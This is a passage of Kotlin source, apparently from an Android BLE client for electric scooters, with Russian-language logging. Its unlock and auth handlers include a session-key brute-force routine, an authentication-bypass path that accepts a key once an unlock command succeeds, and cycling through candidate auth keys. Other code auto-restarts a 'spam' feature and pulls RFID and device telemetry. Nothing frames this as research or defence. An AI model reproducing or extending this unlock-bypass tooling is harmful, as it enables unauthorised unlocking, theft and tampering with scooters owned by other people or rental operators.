        LogBus.log(if (ok) LogLevel.OK else LogLevel.WARN, "SCOOTER", "${if (ok) okText else failText}, $detail")
    }

    private fun handleUnlockFrame(frame: ScooterFrame) {
        val ok = ScooterCodec.isLockStatusSuccess(frame.payload)
        reportLock(frame, "Самокат разблокирован", "Ошибка разблокировки")
        if (ok && bruteRunning) {
            val key = bruteCurrent
            stopKeyBrute()
            bypassPending = false
            if (key >= 0) acceptSessionKey(key, "Перебор: подошел session key 0x${hexByte(key)}")
            return
        }
        if (ok && bypassPending) {
            bypassPending = false
            acceptSessionKey(bypassKey, "Обход auth: unlock сработал, session key 0x${hexByte(bypassKey)}")
            return
        }
        if (unlockVariant < 0) return
        unlockTimeout?.let { handler.removeCallbacks(it) }
        unlockTimeout = null
        if (ok) {
            unlockVariant = -1
            unlockKey = 0
        } else if (unlockVariant == 0) {
            retryUnlock("Первый вариант отклонен")
        } else {
            unlockVariant = -1
            unlockKey = 0
        }
    }

    private fun handleAuthFrame(frame: ScooterFrame) {
        if (!authPending) return
        authPending = false
        authTimeout?.let { handler.removeCallbacks(it) }
        authTimeout = null
        if (frame.payload.size >= 2 && (frame.payload[0].toInt() and 0xFF) == 1) {
            sessionKey = frame.payload[1].toInt() and 0xFF
            authenticated = true
            reconnectAttempts = 0
            if (prefs.bleKey != authKey) prefs.bleKey = authKey
            _incompatible.value = _incompatible.value - deviceAddress
            LogBus.ok(AUTH_TAG, "Ключ верный, сессионный ключ 0x${hexByte(sessionKey)}")
            _state.value = ClientState.READY
            onAuthenticated()
        } else {
            tryNextAuthKey("Ключ отклонен")
        }
    }

    private fun onAuthenticated() {
        requestTelemetry()
        if (prefs.autoResumeSpam && wantedSpam && !spamRunning) {
            LogBus.info(SPAM_TAG, "Автовосстановление спама после переподключения")
            startSpam()
        } else if (!prefs.autoResumeSpam) {
            wantedSpam = false
        }
    }

    fun requestTelemetry() {
        if (!isReady || activeKind != DeviceKind.SCOOTER) return
        sendService(ScooterCodec.CMD_DEVICE_INFO, byteArrayOf(0x01))
        sendService(ScooterCodec.CMD_SCOOTER_INFO, byteArrayOf(0x01))
        sendService(ScooterCodec.CMD_REALTIME, byteArrayOf(0x01))
        sendService(ScooterCodec.CMD_RFID, byteArrayOf(0x01))
    }

    private fun handleDeviceInfo(frame: ScooterFrame) {
        if (ScooterCodec.isAsciiDeviceInfo(frame.payload)) {
            val info = ScooterCodec.parseIotText(frame.payload)
            _iot.value = info
            LogBus.info("INFO", info.text.orEmpty())
            return
        }
        val info = ScooterCodec.parseIotInfo(frame.payload)
        if (info != null) {
            _iot.value = info
            LogBus.info("INFO", "IoT: значение=${info.value}, флаги=0x${hexByte(info.flags)}, версия=${info.version}")
        }
    }

    private fun kindLabel(kind: DeviceKind): String = when (kind) {
        DeviceKind.SCOOTER -> "самокат"
        DeviceKind.HEADSET -> "гарнитура"
        DeviceKind.OTHER -> "BLE"
    }
}
